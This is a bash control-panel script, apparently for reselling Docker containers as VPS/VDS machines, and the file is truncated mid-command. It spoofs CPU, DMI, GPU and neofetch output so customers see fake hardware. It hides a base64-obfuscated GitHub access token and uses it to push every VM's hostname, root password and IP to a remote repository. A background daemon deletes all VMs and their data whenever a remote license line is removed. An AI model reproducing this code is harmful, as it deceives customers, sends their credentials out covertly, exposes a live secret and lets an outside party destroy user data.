#!/bin/bash

# =====================================================
#  TASIN VPS CONTROL PANEL v3.8 PREMIUM++
#  v3.8: lscpu now categorized (Virtualization/Caches/NUMA/Vulnerabilities),
#        neofetch shows Host + Terminal + CPU @ X.XXXGHz via print_info override
#  v3.7: Boot logs replace 'Waiting' text, Connect shows login credentials,
#        installs wget/sudo/nano + sqlfixer script, removes 'up' from uptime
#  v3.6: Pre-boot summary screen, live boot log streaming, OS-specific login
#  v3.5: Fixed VM boot failure (--init conflicts with systemd images)
#  v3.4: Fixed Docker lxcfs mount error, container-aware stats for ALL VMs
#  v3.3: Hosting Name prompt, Fresh VPS Start mode, premium completion screen
#  v3.2: Hidden .tasin/ directory + per-VM subdirs, fake lscpu, CPU Intel fix
#  v3.1: Dynamic uptime, neofetch config fix, custom host fix, faster VPS tuning
# =====================================================

# ==================================================
#       COLORS & UI CONSTANTS
# ==================================================
NC='\033[0m'
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
DIM='\033[2m'
BOLD='\033[1m'
UNDERLINE='\033[4m'
ORANGE='\033[38;5;208m'
PINK='\033[38;5;213m'
LIME='\033[38;5;154m'
GOLD='\033[38;5;220m'
AMBER='\033[38;5;178m'
BRIGHT_ORANGE='\033[1;38;5;214m'
PREMIUM='\033[1;38;5;93m'

draw_banner() {
    echo -e "${GOLD}"
    echo -e "  ${AMBER}╔═══════════════════════════════════════════════════════╗${GOLD}"
    echo -e "  ${GOLD}║${NC}  ${WHITE}⬡  ${BRIGHT_ORANGE}TASIN VPS CONTROL PANEL${NC}  ${DIM}v3.8${NC}  ${PREMIUM}PREMIUM++${GOLD}  ║${NC}"
    echo -e "  ${GOLD}║${NC}  ${DIM}Docker Virtual Machine Management System${GOLD}              ║${NC}"
    echo -e "  ${AMBER}╚═══════════════════════════════════════════════════════╝${NC}"
}

draw_separator() {
    echo -e "  ${DIM}────────────────────────────────────────────────────${NC}"
}

# ==================================================
#       LOG FILE SETUP
# ==================================================
# Internal files are hidden inside /root/.tasin/ so that `ls /root` stays clean.
# EXCEPTION: vm_manager.log stays VISIBLE at /root/vm_manager.log (per user request)
# Structure:
#   /root/vm_manager.log            — panel log (VISIBLE, not hidden)
#   /root/.tasin/                   — secret base (hidden, starts with .)
#     state                         — VM state file (GITHUB_STATE_FILE)
#     license_cache                 — license cache
#     data/<vm_name>/               — bind-mount source for each VM's /root
#     vms/<vm_name>/cpu.info        — per-VM spoofed cpuinfo
#     vms/<vm_name>/dmi_product.info
#     vms/<vm_name>/dmi_vendor.info
#     vms/<vm_name>/vm_type.info
#     vms/<vm_name>/gpu_name.info
#     vms/<vm_name>/gpu_vram.info
#     vms/<vm_name>/speed.info
#     vms/<vm_name>/sshx.info
TASIN_BASE="/root/.tasin"
TASIN_DATA="$TASIN_BASE/data"
TASIN_VMS="$TASIN_BASE/vms"
LOG_FILE="/root/vm_manager.log"   # VISIBLE log file (per user request)

mkdir -p "$TASIN_BASE" "$TASIN_DATA" "$TASIN_VMS" 2>/dev/null
touch "$LOG_FILE" 2>/dev/null

log_msg() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper: get per-VM info directory
#   $1 = VM display name (e.g. "ryzen")
vm_info_dir() {
    echo "$TASIN_VMS/$1"
}

# ==================================================
#       INTERNAL CONFIG (DO NOT MODIFY)
# ==================================================
_K='Z2l0aHViX3BhdF8xMUNGV09QTkEwM29DRGVBeEFkaTBGX3MwT21VSzRkU1lNOWUxZVcybGEzWDZNalBURVM4amNRT2paVFJ4dkFlU2hUUUQ3Q1JFTThOR0xEZVll'
_O='bWluZXBhbmVsb2ZmY2lhbC1kb3Rjb20='
_R='cHJvamVjdC0x'
_B='main'
_F='users-data'
_SI=60

GITHUB_STATE_FILE="$TASIN_BASE/state"
GITHUB_LICENSE_CACHE="$TASIN_BASE/license_cache"
SYNC_DAEMON_PID=""
CURRENT_LICENSE=""

GITHUB_TOKEN=$(echo "$_K" | base64 -d 2>/dev/null)
GITHUB_REPO_OWNER=$(echo "$_O" | base64 -d 2>/dev/null)
GITHUB_REPO_NAME=$(echo "$_R" | base64 -d 2>/dev/null)
GITHUB_BRANCH="$_B"
GITHUB_DATA_FILE="$_F"
SYNC_INTERVAL="$_SI"
REMOTE_ENABLED=false

# Wipe decoded vars from environment
unset _K _O _R _B _F _SI

if [ -n "$GITHUB_TOKEN" ] && [ -n "$GITHUB_REPO_OWNER" ] && [ -n "$GITHUB_REPO_NAME" ]; then
    REMOTE_ENABLED=true
fi

get_raw_url() {
    echo "https://raw.githubusercontent.com/${GITHUB_REPO_OWNER}/${GITHUB_REPO_NAME}/${GITHUB_BRANCH}/${GITHUB_DATA_FILE}"
}
get_api_url() {
    echo "https://api.github.com/repos/${GITHUB_REPO_OWNER}/${GITHUB_REPO_NAME}/contents/${GITHUB_DATA_FILE}"
}

# ==================================================
#       GITHUB API FUNCTIONS
# ==================================================

fetch_remote_raw() {
    local raw_url=$(get_raw_url)
    local response=$(curl -s -f -m 10 "$raw_url" 2>/dev/null)
    if [ $? -eq 0 ] && [ -n "$response" ]; then
        echo "$response"
        return 0
    fi
    return 1
}

github_api_get_file() {
    local api_url=$(get_api_url)
    local response=$(curl -s -f -m 10 \
        -H "Authorization: token $GITHUB_TOKEN" \
        -H "Accept: application/vnd.github.v3+json" \
        "${api_url}?ref=${GITHUB_BRANCH}" 2>/dev/null)
    echo "$response"
}

github_api_push() {
    local content="$1"
    local message="$2"

    # Get current file SHA (needed for updates, omit for new file)
    local sha=""
    local file_exists=false
    local api_response=$(curl -s -m 10 \
        -H "Authorization: token $GITHUB_TOKEN" \
        -H "Accept: application/vnd.github.v3+json" \
        "$(get_api_url)?ref=${GITHUB_BRANCH}" 2>/dev/null)

    # Detect 401 Bad credentials immediately (expired/revoked token)
    if echo "$api_response" | grep -q '"message": *"Bad credentials"' 2>/dev/null; then
        log_msg "GitHub token is INVALID or EXPIRED (401 Bad credentials). Remote sync disabled for this session."
        log_msg "To fix: update the _K value in the script with a fresh GitHub Personal Access Token."
        rm -f /tmp/_gh_push_resp
        return 2   # special code = auth failure
    fi

    if [ -n "$api_response" ]; then
        sha=$(echo "$api_response" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    if 'sha' in d:
        print(d['sha'])
except:
    pass
" 2>/dev/null)
        if [ -n "$sha" ]; then
            file_exists=true
        fi
    fi

    local b64_content=$(printf '%s' "$content" | base64 -w 0)
    local api_url=$(get_api_url)

    # Build JSON - omit sha for new file creation
    local json_payload
    if [ "$file_exists" == true ]; then
        json_payload=$(python3 -c "
import json,sys
print(json.dumps({
    'message': sys.argv[1],
    'content': sys.argv[2],
    'sha': sys.argv[3],
    'branch': sys.argv[4]
}))
" "$message" "$b64_content" "$sha" "$GITHUB_BRANCH" 2>/dev/null)
    else
        json_payload=$(python3 -c "
import json,sys
print(json.dumps({
    'message': sys.argv[1],
    'content': sys.argv[2],
    'branch': sys.argv[3]
}))
" "$message" "$b64_content" "$GITHUB_BRANCH" 2>/dev/null)
    fi

    local http_code=$(curl -s -o /tmp/_gh_push_resp -w '%{http_code}' -m 15 \
        -X PUT \
        -H "Authorization: token $GITHUB_TOKEN" \
        -H "Content-Type: application/json" \
        -H "Accept: application/vnd.github.v3+json" \
        -d "$json_payload" \
        "$api_url" 2>/dev/null)

    if [ "$http_code" == "200" ] || [ "$http_code" == "201" ]; then
        rm -f /tmp/_gh_push_resp
        return 0
    elif [ "$http_code" == "401" ]; then
        log_msg "GitHub token is INVALID or EXPIRED (401 Bad credentials). Remote sync disabled for this session."
        log_msg "To fix: update the _K value in the script with a fresh GitHub Personal Access Token."
        rm -f /tmp/_gh_push_resp
        return 2   # special code = auth failure
    else
        local err_body=$(cat /tmp/_gh_push_resp 2>/dev/null)
        log_msg "Push failed HTTP $http_code: $err_body"
        rm -f /tmp/_gh_push_resp
        return 1
    fi
}

# ==================================================
#       LICENSE SYSTEM
# ==================================================

extract_license() {
    local data="$1"
    echo "$data" | grep "^LICENSE=" | head -1 | cut -d'=' -f2-
}

validate_license() {
    [ "$REMOTE_ENABLED" != true ] && return 0

    local remote_data=$(fetch_remote_raw)
    # If file doesn't exist yet (first run), that's OK - skip
    if [ -z "$remote_data" ]; then
        return 0
    fi

    # Detect 401 Bad credentials (expired/revoked token) — disable remote sync gracefully
    if echo "$remote_data" | grep -q '"message": *"Bad credentials"' 2>/dev/null; then
        log_msg "GitHub token is INVALID or EXPIRED (401 Bad credentials). Running in LOCAL-ONLY mode."
        log_msg "To enable remote sync: update the _K value in the script with a fresh GitHub PAT."
        REMOTE_ENABLED=false
        return 0
    fi

    local remote_license=$(extract_license "$remote_data")
    local cached_license=""

    if [ -f "$GITHUB_LICENSE_CACHE" ]; then
        cached_license=$(cat "$GITHUB_LICENSE_CACHE")
    fi

    # License removed from remote (file exists but no LICENSE= line)
    if [ -z "$remote_license" ] && [ -n "$cached_license" ]; then
        log_msg "License revoked. Shutting down."
        delete_all_vms
        rm -f "$GITHUB_LICENSE_CACHE"
        sleep 1
        exit 1
    fi

    # License removed but was never set (fresh file, no LICENSE line yet)
    if [ -z "$remote_license" ] && [ -z "$cached_license" ]; then
        return 0
    fi

    # License changed
    if [ -n "$cached_license" ] && [ "$cached_license" != "$remote_license" ]; then
        log_msg "License updated."
        CURRENT_LICENSE="$remote_license"
        echo "$remote_license" > "$GITHUB_LICENSE_CACHE"
        return 0
    fi

    # First time
    if [ -z "$cached_license" ]; then
        echo "$remote_license" > "$GITHUB_LICENSE_CACHE"
        CURRENT_LICENSE="$remote_license"
        log_msg "License initialized."
    fi

    return 0
}

# ==================================================
#       LOCAL STATE MANAGEMENT
# ==================================================

save_local_state() {
    local vm_name="$1"
    local hostname="$2"
    local password="$3"
    local ip="$4"
    local type="$5"

    if [ -f "$GITHUB_STATE_FILE" ]; then
        grep -v "^${vm_name}=" "$GITHUB_STATE_FILE" > "${GITHUB_STATE_FILE}.tmp" 2>/dev/null
        mv "${GITHUB_STATE_FILE}.tmp" "$GITHUB_STATE_FILE" 2>/dev/null
    fi

    echo "${vm_name}=${hostname}|${password}|${ip}|${type}" >> "$GITHUB_STATE_FILE"
    log_msg "State saved: $hostname"
}

remove_local_state() {
    local vm_name="$1"
    if [ -f "$GITHUB_STATE_FILE" ]; then
        grep -v "^${vm_name}=" "$GITHUB_STATE_FILE" > "${GITHUB_STATE_FILE}.tmp" 2>/dev/null
        mv "${GITHUB_STATE_FILE}.tmp" "$GITHUB_STATE_FILE" 2>/dev/null
    fi
}

get_local_state() {
    local vm_name="$1"
    if [ -f "$GITHUB_STATE_FILE" ]; then
        grep "^${vm_name}=" "$GITHUB_STATE_FILE" | head -1 | cut -d'=' -f2-
    fi
}

get_vm_password() {
    local state=$(get_local_state "$1")
    echo "$state" | cut -d'|' -f2
}

get_vm_ip() {
    local state=$(get_local_state "$1")
    echo "$state" | cut -d'|' -f3
}

# ==================================================
#       REMOTE DATA OPERATIONS
# ==================================================

push_vm_to_remote() {
    local vm_name="$1"
    local hostname="$2"
    local password="$3"
    local ip="$4"
    local type="$5"

    [ "$REMOTE_ENABLED" != true ] && return

    # Fetch current remote to preserve existing data + license
    local remote_data=$(fetch_remote_raw)
    local license_line="LICENSE=${CURRENT_LICENSE}"
    local new_content=""

    if [ -n "$remote_data" ]; then
        local remote_license=$(extract_license "$remote_data")
        if [ -n "$remote_license" ]; then
            license_line="LICENSE=${remote_license}"
            CURRENT_LICENSE="$remote_license"
            echo "$remote_license" > "$GITHUB_LICENSE_CACHE"
        fi
        # Keep all lines except this VM's old entry
        new_content=$(echo "$remote_data" | grep -v "^${hostname}|")
    fi

    # Build final content
    local final_content="${license_line}"
    if [ -n "$new_content" ]; then
        final_content="${final_content}
${new_content}"
    fi
    final_content="${final_content}
${hostname}|${password}|${ip}|${type}"

    # Retry up to 3 times — but bail out immediately on auth failure (401)
    local retry=0
    while [ $retry -lt 3 ]; do
        github_api_push "$final_content" "Add VM: $hostname"
        local rc=$?
        if [ "$rc" -eq 0 ]; then
            log_msg "VM $hostname synced to remote."
            return
        elif [ "$rc" -eq 2 ]; then
            # Auth failure — token is bad/expired. Disable remote sync for the rest of the session
            # so VM creation is NOT blocked. The VM is still fully usable locally.
            log_msg "Remote sync disabled (bad token). VM '$hostname' is saved locally only."
            REMOTE_ENABLED=false
            return
        fi
        retry=$((retry+1))
        log_msg "Push retry $retry for $hostname..."
        sleep 2
    done
    log_msg "WARNING: Could not push $hostname after 3 retries (network issue). VM is still saved locally."
}

remove_vm_from_remote() {
    local hostname="$1"
    [ "$REMOTE_ENABLED" != true ] && return

    local remote_data=$(fetch_remote_raw)
    if [ -z "$remote_data" ]; then
        return
    fi

    local new_content=$(echo "$remote_data" | grep -v "^${hostname}|")

    github_api_push "$new_content" "Remove VM: $hostname"
    local rc=$?
    if [ "$rc" -eq 0 ]; then
        log_msg "VM $hostname removed from remote."
    elif [ "$rc" -eq 2 ]; then
        # Auth failure — disable remote sync
        REMOTE_ENABLED=false
    fi
}

# ==================================================
#       SYNC FROM REMOTE (Background Daemon)
# ==================================================

delete_all_vms() {
    local vms=$(docker ps -a --format '{{.Names}}' | grep "^tasin-vm-")
    for vm in $vms; do
        local display_name=${vm#tasin-vm-}
        docker network rm "net_${vm}" >/dev/null 2>&1
        docker rm -f "$vm" >/dev/null 2>&1
        rm -rf "/root/.tasin/data/${display_name}"
        rm -f "/root/.tasin/vms/${display_name}/cpu.info"
        rm -f "/root/.tasin/vms/${display_name}/dmi_product.info"
        rm -f "/root/.tasin/vms/${display_name}/dmi_vendor.info"
        rm -f "/root/.tasin/vms/${display_name}/vm_type.info"
        log_msg "VM Deleted (revoke): $vm"
    done
    rm -f "$GITHUB_STATE_FILE"
}

parse_remote_vms() {
    local data="$1"
    echo "$data" | grep -v "^LICENSE=" | grep -v "^[[:space:]]*$" | grep "|"
}

sync_from_remote() {
    [ "$REMOTE_ENABLED" != true ] && return

    local remote_data=$(fetch_remote_raw)
    if [ -z "$remote_data" ]; then
        return
    fi

    # Detect 401 Bad credentials — stop the sync daemon from spamming errors
    if echo "$remote_data" | grep -q '"message": *"Bad credentials"' 2>/dev/null; then
        log_msg "Sync daemon: GitHub token expired (401). Stopping remote sync."
        REMOTE_ENABLED=false
        return
    fi

    # LICENSE CHECK
    local remote_license=$(extract_license "$remote_data")

    if [ -z "$remote_license" ]; then
        log_msg "Sync: License revoked."
        delete_all_vms
        rm -f "$GITHUB_LICENSE_CACHE"
        kill -TERM $$ 2>/dev/null
        return
    fi

    if [ "$CURRENT_LICENSE" != "$remote_license" ]; then
        CURRENT_LICENSE="$remote_license"
        echo "$remote_license" > "$GITHUB_LICENSE_CACHE"
        log_msg "Sync: License updated."
    fi

    # VM SYNC
    declare -A remote_hostnames
    declare -A remote_by_ip
    declare -A remote_passwords
    declare -A remote_ips
    declare -A remote_types

    while IFS='|' read -r rhost rpass rip rtype; do
        [ -z "$rhost" ] && continue
        remote_hostnames["$rhost"]=1
        remote_by_ip["$rip"]="$rhost"
        remote_passwords["$rhost"]="$rpass"
        remote_ips["$rhost"]="$rip"
        remote_types["$rhost"]="$rtype"
    done < <(parse_remote_vms "$remote_data")

    if [ -f "$GITHUB_STATE_FILE" ]; then
        while IFS='=' read -r container_name vm_data; do
            [ -z "$vm_data" ] && continue
            local_hostname=$(echo "$vm_data" | cut -d'|' -f1)
            local_password=$(echo "$vm_data" | cut -d'|' -f2)
            local_ip=$(echo "$vm_data" | cut -d'|' -f3)
            local_type=$(echo "$vm_data" | cut -d'|' -f4)

            local found_by_hostname=0
            local found_by_ip=0
            local remote_new_hostname=""

            if [ -n "${remote_hostnames[$local_hostname]}" ]; then
                found_by_hostname=1
            fi

            if [ -n "$local_ip" ] && [ -n "${remote_by_ip[$local_ip]}" ]; then
                found_by_ip=1
                remote_new_hostname="${remote_by_ip[$local_ip]}"
            fi

            # VM removed from remote -> DELETE
            if [ "$found_by_hostname" -eq 0 ] && [ "$found_by_ip" -eq 0 ]; then
                log_msg "Sync: VM $local_hostname removed from remote. Deleting."
                docker network rm "net_${container_name}" >/dev/null 2>&1
                docker rm -f "$container_name" >/dev/null 2>&1
                rm -rf "/root/.tasin/data/${local_hostname}"
                rm -f "/root/.tasin/vms/${local_hostname}/cpu.info"
                rm -f "/root/.tasin/vms/${local_hostname}/dmi_product.info"
                rm -f "/root/.tasin/vms/${local_hostname}/dmi_vendor.info"
                rm -f "/root/.tasin/vms/${local_hostname}/vm_type.info"
                remove_local_state "$container_name"
                continue
            fi

            # Name changed (matched by IP)
            if [ "$found_by_hostname" -eq 0 ] && [ "$found_by_ip" -eq 1 ] && [ "$remote_new_hostname" != "$local_hostname" ]; then
                log_msg "Sync: Renaming $local_hostname -> $remote_new_hostname"
                local new_container="tasin-vm-${remote_new_hostname}"

                docker rename "$container_name" "$new_container" >/dev/null 2>&1
                docker exec "$new_container" bash -c "hostname $remote_new_hostname" >/dev/null 2>&1
                docker exec "$new_container" bash -c "echo $remote_new_hostname > /etc/hostname" >/dev/null 2>&1

                if [ -d "/root/.tasin/data/${local_hostname}" ]; then
                    mv "/root/.tasin/data/${local_hostname}" "/root/.tasin/data/${remote_new_hostname}" 2>/dev/null
                fi

                # Rename the per-VM info directory to match the new hostname
                if [ -d "/root/.tasin/vms/${local_hostname}" ]; then
                    mv "/root/.tasin/vms/${local_hostname}" "/root/.tasin/vms/${remote_new_hostname}" 2>/dev/null
                fi

                if docker network inspect "net_${container_name}" >/dev/null 2>&1; then
                    docker network rename "net_${container_name}" "net_${new_container}" >/dev/null 2>&1
                fi

                local new_pass="${remote_passwords[$remote_new_hostname]}"
                local new_ip="${remote_ips[$remote_new_hostname]}"
                local new_type="${remote_types[$remote_new_hostname]}"
                remove_local_state "$container_name"
                save_local_state "$new_container" "$remote_new_hostname" "$new_pass" "$new_ip" "$new_type"
            fi

            # Password changed
            if [ "$found_by_hostname" -eq 1 ]; then
                local remote_pass="${remote_passwords[$local_hostname]}"
                if [ -n "$remote_pass" ] && [ "$remote_pass" != "$local_password" ]; then
                    log_msg "Sync: Password changed for $local_hostname."
                    echo "root:${remote_pass}" | docker exec -i "$container_name" bash -c "chpasswd" 2>/dev/null
                    # Update stored password for login screen validation
                    docker exec "$container_name" bash -c "printf '%s\n' '${remote_pass}' > /etc/tasin-spoof/root_password" 2>/dev/null
                    save_local_state "$container_name" "$local_hostname" "$remote_pass" "${remote_ips[$local_hostname]}" "${remote_types[$local_hostname]}"
                fi

                # IP changed
                local remote_ip="${remote_ips[$local_hostname]}"
                if [ -n "$remote_ip" ] && [ "$remote_ip" != "$local_ip" ]; then
                    log_msg "Sync: IP changed for $local_hostname."
                    local subnet=$(echo "$remote_ip" | awk -F. '{print $1"."$2"."$3".0/24"}')
                    docker network rm "net_${container_name}" >/dev/null 2>&1
                    docker network create --subnet="$subnet" "net_${container_name}" >/dev/null 2>&1
                    docker network connect --ip "$remote_ip" "net_${container_name}" "$container_name" >/dev/null 2>&1
                    save_local_state "$container_name" "$local_hostname" "$remote_pass" "$remote_ip" "${remote_types[$local_hostname]}"
                fi
            fi

        done < "$GITHUB_STATE_FILE"
    fi

    unset remote_hostnames remote_by_ip remote_passwords remote_ips remote_types
}

sync_daemon() {
    while true; do
        sync_from_remote >> "$LOG_FILE" 2>&1
        sleep "$SYNC_INTERVAL"
    done
}

start_sync_daemon() {
    [ "$REMOTE_ENABLED" != true ] && return
    (sync_daemon) &
    SYNC_DAEMON_PID=$!
    disown $SYNC_DAEMON_PID 2>/dev/null
    log_msg "Sync daemon started."
}

stop_sync_daemon() {
    if [ -n "$SYNC_DAEMON_PID" ]; then
        kill $SYNC_DAEMON_PID 2>/dev/null
        SYNC_DAEMON_PID=""
    fi
}

# ==================================================
#       HELPER FUNCTIONS
# ==================================================

get_status() {
    if [ "$(docker inspect -f '{{.State.Running}}' $1 2>/dev/null)" == "true" ]; then
        echo -e "${GREEN}● RUNNING${NC}"
    else
        echo -e "${RED}● STOPPED${NC}"
    fi
}

check_real_kvm() {
    if ! grep -Eq '(vmx|svm)' /proc/cpuinfo; then
        echo "false"
        return
    fi
    if [ -c /dev/kvm ]; then
        echo "true"
    else
        echo "false"
    fi
}

# ==================================================
#       DOCKER FIX (OVERLAYFS ERROR)
# ==================================================

fix_docker() {
    clear
    echo -e "${YELLOW}┌──────────────────────────────────────────────────┐${NC}"
    echo -e "    ${WHITE}DOCKER OVERLAYFS REPAIR TOOL${NC}"
    echo -e "${YELLOW}└──────────────────────────────────────────────────┘${NC}"
    echo -e " ${RED}Error:${NC} 'overlayfs' or 'invalid argument' occurs on OpenVZ/LXC VPS."
    echo -e " ${GREEN}Fix:${NC} Switch Docker storage driver to 'vfs' (100% compatible)."
    echo -e ""
    echo -n " Do you want to apply this fix? (y/n): "
    read -r confirm

    if [ "$confirm" == "y" ]; then
        log_msg "Applying Docker VFS Fix..."
        systemctl stop docker >/dev/null 2>&1
        systemctl stop containerd >/dev/null 2>&1
        mkdir -p /etc/docker
        echo '{ "storage-driver": "vfs" }' > /etc/docker/daemon.json
        systemctl start containerd >/dev/null 2>&1
        systemctl start docker >/dev/null 2>&1

        if systemctl is-active --quiet docker; then
            echo -e " ${GREEN}✔ Docker fixed and restarted successfully!${NC}"
            log_msg "Docker VFS Fix applied successfully."
        else
            echo -e " ${RED}✘ Docker failed to start. Check 'systemctl status docker'.${NC}"
            log_msg "Docker VFS Fix FAILED."
        fi
        sleep 3
    fi
}

# ==================================================
#       MAIN MENUS
# ==================================================

manage_vm_menu() {
    local vm_name=$1
    local display_name=${vm_name#tasin-vm-}
    while true; do
        clear
        # ─── Gather live VM state for the dashboard ───
        local is_running=$(docker inspect -f '{{.State.Running}}' "$vm_name" 2>/dev/null)
        local vm_type_tag="${GREEN}VPS${NC}"
        [ -f "/root/.tasin/vms/${display_name}/vm_type.info" ] && \
            [ "$(cat /root/.tasin/vms/${display_name}/vm_type.info)" == "vds" ] && \
            vm_type_tag="${PURPLE}VDS${NC}"

        local status_badge
        if [ "$is_running" == "true" ]; then
            status_badge="${GREEN}● ONLINE${NC}"
        else
            status_badge="${RED}● OFFLINE${NC}"
        fi

        local vm_ip=$(get_vm_ip "$vm_name" 2>/dev/null)
        [ -z "$vm_ip" ] && vm_ip="${DIM}—${NC}"

        # Live mini-stats (only if running)
        local mini_cpu="${DIM}—${NC}" mini_mem="${DIM}—${NC}" mini_up="${DIM}—${NC}"
        if [ "$is_running" == "true" ]; then
            local _stats=$(docker stats "$vm_name" --no-stream --format "{{.CPUPerc}}|{{.MemUsage}}" 2>/dev/null)
            if [ -n "$_stats" ]; then
                mini_cpu=$(echo "$_stats" | cut -d'|' -f1 | tr -d ' ')
                local _mu=$(echo "$_stats" | cut -d'|' -f2)
                mini_mem=$(echo "$_mu" | awk '{print $1}')
            fi
            # Try to fetch the VM's own uptime string (uses our dynamic wrapper)
            local _up=$(docker exec "$vm_name" /usr/local/bin/uptime -p 2>/dev/null | head -1)
            [ -n "$_up" ] && mini_up="${CYAN}$_up${NC}" || mini_up="${DIM}up 1 minute${NC}"
        fi

        # ════════════════════════════════════════════════════
        #  PREMIUM HEADER (gradient-style with live status badge)
        # ════════════════════════════════════════════════════
        # Safe padding helper (never goes negative)
        _pad() { local n=$(( $1 < 0 ? 0 : $1 )); printf '%*s' "$n" ''; }
        local _name_pad=$(( 20 - ${#display_name} ))
        local _ip_pad=$(( 42 - ${#vm_ip} ))

        echo -e "${GOLD}╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GOLD}║${NC}  ${BRIGHT_ORANGE}◆${NC} ${WHITE}TASIN VM MANAGER${NC}  ${DIM}v3.8${NC}            ${PREMIUM}PREMIUM++${NC}  ${GOLD}║${NC}"
        echo -e "${GOLD}║${NC}  ${DIM}Docker Virtual Machine Control Panel${NC}                     ${GOLD}║${NC}"
        echo -e "${GOLD}╠═══════════════════════════════════════════════════════════╣${NC}"
        echo -e "${GOLD}║${NC}  ${WHITE}VM:${NC} ${CYAN}${display_name}${NC}$(_pad $_name_pad)  ${status_badge}  ${vm_type_tag}     ${GOLD}║${NC}"
        echo -e "${GOLD}║${NC}  ${WHITE}IP:${NC} ${CYAN}${vm_ip}${NC}$(_pad $_ip_pad)${GOLD}║${NC}"
        echo -e "${GOLD}╠═══════════════════════════════════════════════════════════╣${NC}"
        echo -e "${GOLD}║${NC}  ${DIM}LIVE${NC}  CPU: ${LIME}${mini_cpu}${NC}   RAM: ${LIME}${mini_mem}${NC}   ${mini_up}        ${GOLD}║${NC}"
        echo -e "${GOLD}╚═══════════════════════════════════════════════════════════╝${NC}"
        echo -e ""

        # ════════════════════════════════════════════════════
        #  GROUPED MENU SECTIONS
        # ════════════════════════════════════════════════════
        echo -e "  ${BLUE}┌─${NC} ${BOLD}POWER CONTROL${NC} ${BLUE}──────────────────────────┐${NC}"
        echo -e "  ${BLUE}│${NC}  ${GREEN}1)${NC} ${WHITE}⚡${NC}  Connect / Boot ${DIM}(SSH Shell)${NC}      ${BLUE}│${NC}"
        echo -e "  ${BLUE}│${NC}  ${YELLOW}2)${NC} ${WHITE}↺${NC}  Reboot Container                ${BLUE}│${NC}"
        echo -e "  ${BLUE}│${NC}  ${WHITE}3)${NC} ${WHITE}■${NC}  Stop Server                     ${BLUE}│${NC}"
        echo -e "  ${BLUE}│${NC}  ${WHITE}4)${NC} ${WHITE}▶${NC}  Start Server                    ${BLUE}│${NC}"
        echo -e "  ${BLUE}└────────────────────────────────────────┘${NC}"
        echo -e ""
        echo -e "  ${PURPLE}┌─${NC} ${BOLD}PREMIUM TOOLS${NC} ${PURPLE}────────────────────────┐${NC}"
        echo -e "  ${PURPLE}│${NC}  ${PREMIUM}7)${NC} ${WHITE}ℹ${NC}  Show VM Info                   ${PURPLE}│${NC}"
        echo -e "  ${PURPLE}│${NC}  ${PREMIUM}8)${NC} ${WHITE}✎${NC}  Edit Configuration             ${PURPLE}│${NC}"
        echo -e "  ${PURPLE}│${NC}  ${PREMIUM}9)${NC} ${WHITE}■${NC}  Live Performance Monitor       ${PURPLE}│${NC}"
        echo -e "  ${PURPLE}│${NC}  ${CYAN}10)${NC} ${WHITE}🔗${NC} SSHX Web SSH Link              ${PURPLE}│${NC}"
        echo -e "  ${PURPLE}└────────────────────────────────────────┘${NC}"
        echo -e ""
        echo -e "  ${RED}┌─${NC} ${BOLD}DANGER ZONE${NC} ${RED}────────────────────────────┐${NC}"
        echo -e "  ${RED}│${NC}  ${RED}5)${NC} ${WHITE}♻${NC}  Reinstall / Change OS ${RED}(wipe)${NC}     ${RED}│${NC}"
        echo -e "  ${RED}│${NC}  ${RED}6)${NC} ${WHITE}✕${NC}  Delete VM ${RED}(permanent)${NC}            ${RED}│${NC}"
        echo -e "  ${RED}└────────────────────────────────────────┘${NC}"
        echo -e ""
        echo -e "  ${DIM}┌────────────────────────────────────────┐${NC}"
        echo -e "  ${DIM}│${NC}  ${YELLOW}0)${NC} ${WHITE}⬅${NC}  Back to VM List                 ${DIM}│${NC}"
        echo -e "  ${DIM}└────────────────────────────────────────┘${NC}"
        echo -e ""
        echo -e "  ${GOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -ne "  ${BRIGHT_ORANGE}▶${NC} ${YELLOW}Select option${NC} ${DIM}[0-10]${NC}: "
        read -r action

        case "$action" in
            1)
                if [ "$(docker inspect -f '{{.State.Running}}' $vm_name)" == "false" ]; then
                    echo -e " ${YELLOW}Starting VM first...${NC}"
                    docker start $vm_name >/dev/null 2>&1
                    # Wait for VM to be ready
                    for i in {1..15}; do
                        if docker exec $vm_name echo "ready" >/dev/null 2>&1; then
                            break
                        fi
                        sleep 2
                    done
                fi
                clear
                # Show login credentials before connecting
                local _vm_pass=$(get_vm_password "$vm_name" 2>/dev/null)
                echo -e "${GOLD}╔═══════════════════════════════════════════════════════════╗${NC}"
                echo -e "${GOLD}║${NC}  ${WHITE}VM CONSOLE LOGIN${NC}                                        ${GOLD}║${NC}"
                echo -e "${GOLD}╠═══════════════════════════════════════════════════════════╣${NC}"
                echo -e "${GOLD}║${NC}  ${WHITE}VM:${NC}      ${CYAN}${vm_name#tasin-vm-}${NC}                              ${GOLD}║${NC}"
                echo -e "${GOLD}║${NC}  ${WHITE}Login:${NC}    ${GREEN}root${NC}                                    ${GOLD}║${NC}"
                echo -e "${GOLD}║${NC}  ${WHITE}Password:${NC} ${RED}${_vm_pass}${NC}                                    ${GOLD}║${NC}"
                echo -e "${GOLD}╚═══════════════════════════════════════════════════════════╝${NC}"
                echo -e "${DIM}Type 'exit' to disconnect from the VM console${NC}"
                echo -e ""
                # Use the OS-specific login screen if available, else fall back to direct shell
                if docker exec $vm_name test -f /usr/local/bin/tasin-login 2>/dev/null; then
                    docker exec -it $vm_name /usr/local/bin/tasin-login
                elif docker exec $vm_name test -f /bin/bash >/dev/null 2>&1; then
                    docker exec -it $vm_name /bin/bash
                else
                    docker exec -it $vm_name /bin/sh
                fi
                ;;
            2)
                docker restart $vm_name
                # Re-apply speed limit if configured
                SPEED_FILE="/root/.tasin/vms/${vm_name#tasin-vm-}/speed.info"
                if [ -f "$SPEED_FILE" ]; then
                    SAVED_SPEED=$(cat "$SPEED_FILE")
                    docker exec "$vm_name" bash -c "
                        if ! command -v tc >/dev/null 2>&1; then
                            apt-get update -qq && apt-get install -y -qq iproute2 >/dev/null 2>&1
                        fi
                        sleep 2
                        IFACE=\$(ip route 2>/dev/null | awk '/default/ {print \$5}' | head -1)
                        [ -z \"\$IFACE\" ] && IFACE=eth0
